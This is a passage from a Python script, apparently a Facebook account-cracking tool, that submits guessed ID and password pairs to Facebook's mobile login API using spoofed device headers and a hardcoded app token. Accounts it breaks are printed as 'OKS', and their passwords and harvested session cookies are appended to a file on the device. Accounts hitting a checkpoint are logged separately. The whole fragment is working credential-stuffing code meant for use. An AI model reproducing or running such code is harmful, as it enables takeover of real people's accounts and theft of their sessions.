                                        'x-fb-sim-hni':str(random.randint(20000, 40000)),
                                        'x-fb-connection-type':'False',
                                        'X-Tigon-Is-Retry': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent': bm4_ua(),
                                        'x-fb-net-hni':str(random.randint(20000, 40000)),
                                        'x-fb-connection-bandwidth':str(random.randint(20000, 40000)),
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print(f'\r\r\033[1;32m BMA OKS | '+ids+' | '+pas+'\033[1;32m')
                                        open(f'/sdcard/BMA2-OKS.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m BMA CPS | '+ids+' | '+pas+'\033[1;91m')
                                                open(f'/sdcard/BMA2-CPS.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/BMA-CPS.txt', 'a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
                        
BM4()
